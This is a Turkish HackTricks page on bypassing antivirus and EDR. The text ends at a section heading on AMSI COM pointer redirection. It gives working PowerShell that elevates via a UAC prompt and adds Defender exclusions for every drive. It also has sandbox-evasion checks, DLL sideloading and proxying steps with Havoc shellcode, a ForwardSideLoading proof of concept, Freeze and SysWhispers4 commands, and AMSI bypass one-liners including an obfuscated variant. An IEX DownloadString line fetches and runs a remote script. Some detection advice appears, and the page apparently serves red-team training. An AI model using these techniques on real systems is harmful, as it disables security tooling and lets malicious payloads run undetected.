# Antivirus (AV) Atlatma

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV gibi davranarak Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce yükleyici tarzı UAC tuzağı

Oyun hileleri gibi görünen herkese açık loader'lar genellikle önce **kullanıcıdan yükseltme ister**, ardından Defender'ı etkisiz hâle getiren imzasız Node.js/Nexe yükleyicileri olarak gelir. İşleyiş basittir:

1. `net session` ile yönetici bağlamını kontrol edin. Komut yalnızca çağıran kullanıcı yönetici haklarına sahipse başarılı olur; başarısız olması, loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Orijinal komut satırını korurken beklenen UAC onay istemini tetiklemek için kendisini `RunAs` fiiliyle hemen yeniden başlatın.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “cracked” yazılım yüklediklerine inandığından istem genellikle kabul edilir ve böylece malware, Defender ilkesini değiştirmek için ihtiyaç duyduğu hakları elde eder.<sup>[[26]](#references)</sup>

### Her sürücü harfi için `MpPreference` genel dışlamaları

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, hizmeti doğrudan devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog sürecini sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hâle gelmesi için **son derece geniş kapsamlı dışlamalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılan **gelecekteki payload'lar yok sayılır**.
- `.sys` uzantısı hariç tutulduğu için saldırganlar, Defender'a yeniden dokunmadan daha sonra imzasız sürücüler yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır. Böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden istisnaların kalıcı olduğunu doğrulayabilir veya kapsamını genişletebilir.

Hiçbir Defender hizmeti durdurulmadığından, yüzeysel durum denetimleri “antivirüs etkin” demeye devam eder; oysa gerçek zamanlı inceleme bu yolları hiç denetlemez.<sup>[[26]](#references)</sup>

## **AV Evasion Metodolojisi**

Günümüzde AV'ler, bir dosyanın kötü amaçlı olup olmadığını belirlemek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR'lerde davranış analizi.

### **Statik tespit**

Statik tespit; bir ikili dosya veya betikte bilinen kötü amaçlı dizeleri ya da bayt dizilerini işaretleyerek ve dosyanın kendisinden bilgiler (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, sağlama toplamı vb.) çıkararak gerçekleştirilir. Bu nedenle bilinen herkese açık araçları kullanmak, yakalanma olasılığınızı artırabilir; çünkü bu araçlar muhtemelen analiz edilmiş ve kötü amaçlı olarak işaretlenmiştir. Bu tür tespitlerden kaçınmanın birkaç yolu vardır:

- **Şifreleme**

İkili dosyayı şifrelerseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini bellekte çözerek çalıştıracak bir tür loader gerekir.

- **Obfuscation**

Bazen AV'yi atlatmak için ikili dosyanızdaki veya betiğinizdeki bazı dizeleri değiştirmek yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu işlem zaman alabilir.

- **Özel araçlar**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalar olmaz; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender'ın statik tespitini kontrol etmenin iyi bir yolu [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmaktır. Bu araç, dosyayı birden fazla parçaya böler ve ardından Defender'dan her parçayı ayrı ayrı taramasını ister. Böylece ikili dosyanızdaki hangi dizelerin veya baytların işaretlendiğini tam olarak görebilirsiniz.

Pratik AV Evasion hakkında olan bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi kesinlikle öneririm.

### Statik sınıflandırıcılar için çevrimdışı PE özellik testleri

Paketlenmiş veya şifrelenmiş payload baytları, statik sınıflandırıcının kullandığı girdilerden yalnızca biridir. EMBER2024; import, export, bölüm, başlık ve Authenticode verileri dahil olmak üzere PE özelliklerini çıkarır.<sup>[[48]](#references)</sup> Bir loader denemesinde, zararsız görünen 141 import eklemek EMBER2024'ün kötü amaçlılık puanını %93 düşürürken, kötü amaçlı yazılımlarla ilişkilendirilen import'lar puanı yükseltti. Bu sonuç, söz konusu model ve örnekler için geçerlidir; belirli bir AV/EDR ürününü güvenilir şekilde atlatma yöntemi değildir.<sup>[[50]](#references)</sup>

Yetkili bir loader testi için payload'ı ve çalıştırma yolunu sabit tutun, her varyantta yalnızca amaçlanan bir derleme değişkenini değiştirin ve puanları çevrimdışı karşılaştırın. Derleme değişikliği birden fazla özellik grubunu etkileyebileceğinden, ortaya çıkan PE özelliklerini inceleyin.<sup>[[49]](#references)[[50]](#references)</sup> Amaçlanan import'ların IAT'de kalması için seçilen Win32 API'lerini erişilebilir koddan çağırın. Seçimi değiştirin ve çağrı noktalarını derlemeler arasında dağıtın; imzaya dönüşebilecek sabit bir kamuflaj işlevi oluşturmayın. Deneyde geçerli kod imzalama, export girdileri ve `.pdata` boyutunu artıran daha fazla işlev kullanıldığında puanların düştüğü de raporlandı; geçersiz imzalamanın etkisi azdı ve `.pdata` etkisi küçüktü.<sup>[[50]](#references)</sup>

`thrember` paketi özellik çıkarma ve kıyaslama modelleri sağlar. Paketi kurduktan sonra, mevcut bir `models` diziniyle `thrember.download_models("models")` komutunu kullanın; ardından puanlayıcıyı bu dizinin üst dizininden çalıştırın: indirme yardımcı işlevi çalışma dizinini değiştirir. PE sınıflandırıcısı, derlemeleri bir tarama hizmetine göndermeden bir dizindeki derlemelere puan verebilir:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Karşılaştırma boyunca model ve feature-extractor sürümlerini sabit tutun. Daha düşük bir offline puan, yalnızca bu classifier'ın değiştirilen binary'ye nasıl tepki verdiğini gösterir; davranışsal analizden, emülasyondan veya bir vendor'ın farklı modelinden kaçıldığını kanıtlamaz.<sup>[[49]](#references)[[50]](#references)</sup> [Virtualized payloads'ta build başına polymorphism ve outer-binary camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) için ayrı execution modeline bakın.

### **Dinamik analiz**

Dinamik analiz, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri (ör. tarayıcınızın parolalarını çözmeye ve okumaya çalışmak, LSASS üzerinde minidump almak vb.) izlemesidir. Bu kısımla çalışmak biraz daha zor olabilir, ancak sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır:

- **Çalıştırmadan önce bekletme** Uygulanma biçimine bağlı olarak bu, AV'nin dinamik analizini atlatmanın harika bir yolu olabilir. AV'lerin dosyaları taramak için kullanıcı iş akışını kesintiye uğratmayacak kadar kısa süreleri vardır; bu nedenle uzun süre bekletmek binary analizini aksatabilir. Sorun şu ki birçok AV sandbox'ı, uygulanma biçimine bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'ların genellikle kullanabilecekleri kaynaklar çok kısıtlıdır (ör. < 2GB RAM); aksi takdirde kullanıcının makinesini yavaşlatabilirler. Ayrıca burada oldukça yaratıcı olabilirsiniz; örneğin CPU sıcaklığını, hatta fan hızlarını kontrol edebilirsiniz. Sandbox'ta her şey uygulanmış olmayacaktır.
- **Makineye özgü kontroller** İş istasyonu "contoso.local" etki alanına katılmış bir kullanıcıyı hedeflemek istiyorsanız, bilgisayarın etki alanının belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle malware'inizde çalıştırılmadan önce bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender sandbox'ının içindesiniz demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı kullanılabilecek [@mgeeky](https://twitter.com/mariuszbit) imzalı başka çok iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu gönderide daha önce söylediğimiz gibi, **public tools** eninde sonunda **tespit edilir**. Bu yüzden kendinize şunu sormalısınız:

Örneğin, LSASS dump'ı almak istiyorsanız **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump'ı alan başka bir projeyi kullanabilir misiniz?

Muhtemelen doğru yanıt ikincisidir. Örnek olarak mimikatz'ı ele alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biridir. Projenin kendisi harika olsa da AV'lerden kaçınmak için onunla çalışmak tam bir kâbustur. Bu nedenle, elde etmeye çalıştığınız şey için alternatifler arayın.

> [!TIP]
> Evasion amacıyla payload'larınızı değiştirirken Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun. Ayrıca uzun vadede evasion elde etmek istiyorsanız lütfen **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, onu bir VM'ye kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir. Bu nedenle, payload'ınız DLL olarak çalışmanın bir yoluna sahipse, bazı durumlarda tespit edilmekten kaçınmak için kullanabileceğiniz çok basit bir yöntemdir.

Bu görselde görebileceğiniz gibi, Havoc'un DLL Payload'ı antiscan.me'de 4/26 tespit oranına sahipken EXE payload'ının tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload'ı ile normal bir Havoc DLL karşılaştırması</p></figcaption></figure>

Şimdi DLL dosyalarını kullanarak daha gizli olmanızı sağlayacak bazı yöntemleri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, victim uygulamasını ve kötü amaçlı payload'ları yan yana konumlandırarak loader'ın kullandığı DLL arama sırasından yararlanır.

DLL Sideloading'e açık programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların ve yüklemeye çalıştıkları DLL dosyalarının listesini verir.

**DLL Hijackable/Sideloadable programları kendiniz araştırmanızı** şiddetle tavsiye ederim. Bu teknik doğru uygulandığında oldukça gizlidir; ancak herkese açık olarak bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek, payload'unuzu yüklemesini sağlamaz; çünkü program, bu DLL'nin içinde belirli fonksiyonların bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın yaptığı çağrıları proxy (ve kötü amaçlı) DLL'den orijinal DLL'ye aktarır. Böylece programın işlevselliği korunurken payload'unuzun çalıştırılması da sağlanır.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile kodlanmış) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 tespit oranına sahip! Buna başarılı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t'ın Twitch VOD'unu](https://www.twitch.tv/videos/1644171543) izlemenizi ve ele aldıklarımızı daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **kesinlikle öneririm**.

### Forwarded Export'ları Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan işlevleri dışa aktarabilir: dışa aktarma girdisi kodu göstermek yerine `TargetDll.TargetFunc` biçiminde bir ASCII dizgesi içerir. Bir çağıran dışa aktarılan işlevi çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'ı içinden çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, forward çözümlemesini yapan modülün dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: işlevi KnownDLL olmayan bir modül adına yönlendirilen bir signed DLL bulun, ardından bu signed DLL ile saldırganın kontrolündeki ve yönlendirilen hedef modülle tamamen aynı adı taşıyan bir DLL'yi aynı dizine yerleştirin. Yönlendirilen dışa aktarılmış işlev çağrıldığında loader yönlendirmeyi çözümler ve aynı dizinden sizin DLL'nizi yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütmeyi sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için yönlendirilen işlevi uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İletimi imzalı bir LOLBin ile tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` dosyasını (signed) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini izler
- Loader daha sonra `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatası ancak `DllMain` zaten çalıştıktan sonra alınır

Hunting ipuçları:
- Hedef modülün KnownDLL olmadığı forwarded exports öğelerine odaklanın. KnownDLLs, `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded exports öğelerini şu tür araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma önerileri:
- LOLBins'in (örn. rundll32.exe) sistem dışı yollardan imzalı DLL'ler yüklemesini ve ardından aynı dizinden aynı temel ada sahip KnownDLLs olmayan DLL'leri yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollar altındaki `NCRYPTPROV.dll`
- Kod bütünlüğü ilkelerini (WDAC/AppLocker) zorunlu kılın ve uygulama dizinlerinde yazma+yürütme izinlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış işlemler, doğrudan syscall'lar ve alternatif yürütme yöntemleri kullanarak EDR'ları bypass etmeye yönelik bir payload araç setidir`

Freeze'i shellcode'unuzu gizli bir şekilde yüklemek ve çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion, kedi-fare oyunundan ibarettir; bugün işe yarayan bir şey yarın tespit edilebilir. Bu yüzden hiçbir zaman yalnızca tek bir araca güvenmeyin ve mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls ve SSN Çözümleme (SysWhispers4)

EDR’ler, genellikle `ntdll.dll` syscall stub’larına **user-mode inline hook** yerleştirir. Bu hook’ları atlatmak için doğru **SSN**’yi (System Service Number) yükleyen ve hook’lanmış export giriş noktasını çalıştırmadan kernel mode’a geçiş yapan **direct** veya **indirect** syscall stub’ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağırma seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub’a bir `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export’una uğramaz).
- **Indirect**: Kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget’ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: Diskte statik `0F 05` opcode dizisini gömmekten kaçınır; syscall dizisini çalışma zamanında çözümler.

**Hook’lara dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: Stub baytlarını okumak yerine syscall stub’larını sanal adreslerine göre sıralayarak SSN’leri çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` bölümünden SSN’leri okur ve ardından eşlemeyi kaldırır (bellek içindeki tüm hook’ları atlatır).
- **RecycledGate**: VA’ya göre sıralama ile SSN çıkarımını, stub temiz olduğunda opcode doğrulamayla birleştirir; hook tespit edilirse VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatında DR0 ayarlar ve hook’lanmış baytları ayrıştırmadan, çalışma zamanında SSN’yi `EAX`’ten yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

Clean x64 `ntdll` syscall export’larını SSN için ayrıştırırken hem `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) dizisini hem de önünde `F3 0F 1E FA` (`endbr64`) bulunan aynı diziyi kabul edin. İkincisi, CET önekli bir stub’dır: SSN’nin her zaman sabit bir offset’te olduğunu varsayan bir ayrıştırıcı bunu gözden kaçırır. Indirect-syscall başlatması başarısız olursa ve loader `GetProcAddress` kullanımına geri dönerse, bu export’lar üzerinden yapılan çağrılar yeniden user-mode hook’larla karşılaşabilir.<sup>[[54]](#references)</sup>

### `tprtdll.dll` içindeki alternatif syscall export’ları

Proje, `tprtdll.dll` dosyasının Microsoft tarafından imzalanmış bir DLL olduğunu ve Windows 11 build 26100 ve sonraki sürümlerde `C:\Windows\System32\` konumunda bulunduğunu bildiriyor. Bu dosyanın kod adresleri `ntdll.dll` dosyasındakilerden ayrıdır; dolayısıyla yalnızca bir `ntdll` syscall entrypoint’ini yamalayan bir hook, karşılık gelen `tprtdll` stub’ını yamalamaz. Yukarıdaki SSN çözümleme yöntemlerinden farklı olarak bu yaklaşım, `tprtdll.dll` dosyasını yükler ve kullanılabilir bir `Nt*` veya `Zw*` export’unu doğrudan `GetProcAddress` üzerinden çağırır. DLL’nin ve gerekli export’ların mevcut olduğunu doğrulayın ve uygun NT function prototype’larını kullanın.<sup>[[55]](#references)</sup>

Self-injection PoC’si, RW bellek ayırmak için `tprtdll!NtAllocateVirtualMemoryEx` kullanır, baytları `memcpy` ile kopyalar, bölgeyi `tprtdll!ZwProtectVirtualMemory` ile RX olarak ayarlar ve `tprtdll!RtlCreateUserThread` ile bir thread başlatır.<sup>[[56]](#references)</sup> Cross-process varyantı, erişilebilir bir hedef process handle gerektirir ve kopyalama için `WriteProcessMemory` kullanır.<sup>[[57]](#references)</sup> Projenin export envanterinde `NtOpenProcess`, `NtWriteVirtualMemory` ve `NtCreateThreadEx` bulunmadığından, her injection işlemi alternatif bir export kullanamaz.<sup>[[55]](#references)</sup>

PoC, `RtlCreateUserThread` fonksiyonunun doğrudan bir syscall stub’ı olduğunu veya export `tprtdll` üzerinden çözümlendiği için bu fonksiyonun dahili çağrılarının `ntdll` hook’larından kaçındığını göstermiyor.<sup>[[56]](#references)</sup> Cross-process örneği ayrıca injector’da çözümlenen `WinExec` ve `ExitThread` adreslerini içeriyor; örneğin payload’ının çalışması için bu adreslerin hedefte geçerli olması gerekir.<sup>[[57]](#references)</sup>

Bu yöntem yalnızca ilgili `ntdll` export’larıyla sınırlı hook’ları atlatır; syscall’ları kernel-level monitoring’den gizlemez.<sup>[[55]](#references)</sup> Bunun yerine remote write işlemlerinden ve yeni thread’lerden kaçınan bir injection yöntemi için bkz. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" tehdidini önlemek için oluşturuldu. Başlangıçta AV’ler yalnızca **diskteki dosyaları** tarayabiliyordu; dolayısıyla payload’ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz, yeterli görünürlüğe sahip olmadıkları için AV’ler bunu önlemek adına hiçbir şey yapamıyordu.

AMSI özelliği, Windows’un şu bileşenlerine entegre edilmiştir:

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumunun yükseltilmesi)
- PowerShell (script’ler, etkileşimli kullanım ve dinamik kod değerlendirmesi)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirus çözümlerinin script içeriğini şifrelenmemiş ve gizlenmemiş biçimde sunarak script davranışını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender’da aşağıdaki uyarıya neden olur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Başına `amsi:` ve ardından script’in çalıştığı executable’ın yolunu eklediğine dikkat edin; bu örnekte powershell.exe

Diske hiçbir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekteyken yakalandık.

Ayrıca **.NET 4.8** sürümünden itibaren C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırma için kullanılan `Assembly.Load(byte[])` yöntemini de etkiler. Bu nedenle, AMSI’den kaçınmak istiyorsanız bellekte çalıştırma için daha eski .NET sürümlerini (4.7.2 veya öncesi gibi) kullanmanız önerilir.

AMSI’yi atlatmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespit yöntemleri kullandığından, yüklemeye çalıştığınız script’leri değiştirmek tespitten kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmanı olsa bile script’lerin obfuscation’ını çözebilir; dolayısıyla nasıl yapıldığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da tespitten kaçınmayı o kadar kolay olmaktan çıkarır. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olur; bu, bir şeyin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process’ine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile bu DLL’yi kolayca kurcalamak mümkündür. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmak için birçok yöntem bulmuştur.

**Hata Zorlamak**

AMSI başlatmasının başarısız olmasını zorlamak (`amsiInitFailed`), geçerli process için tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, yaygın kullanımını önlemek için bir signature geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut PowerShell süreci için kullanılamaz hale getirmek tek satırlık bir PowerShell kodu gerektirdi. Elbette bu satır AMSI tarafından tespit edildiğinden, bu tekniği kullanmak için bazı değişiklikler yapmak gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) içinden aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Aklında bulundur: Bu gönderi yayımlandığında muhtemelen işaretlenecek. Bu yüzden amacın tespit edilmemekse herhangi bir kod yayımlamamalısın.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi. Kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu olan amsi.dll içindeki "AmsiScanBuffer" işlevinin adresini bulmayı ve bu işlevin üzerine E_INVALIDARG kodunu döndürecek talimatlar yazmayı içerir. Bu şekilde, gerçek taramanın sonucu 0 döner ve bu da temiz sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan başka birçok teknik de var. Daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo'ya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### `AmsiScanBuffer` patching yerine AMSI COM tarama işaretçisini yönlendirme

